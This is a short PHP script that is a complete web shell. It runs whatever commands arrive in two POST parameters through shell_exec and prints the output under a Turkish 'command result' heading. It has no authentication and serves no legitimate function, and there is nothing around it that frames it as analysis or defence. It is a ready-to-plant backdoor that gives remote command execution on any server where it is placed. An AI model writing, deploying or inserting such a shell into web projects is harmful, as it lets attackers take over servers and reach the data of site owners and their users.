<?php
$fuck=shell_exec($_POST['sosyete']); 
$mokoko=shell_exec($_POST['fuck']); 
echo "<pre><h4>";
echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
echo $fuck;
echo $mokoko;
echo "</h4></pre>";

?>
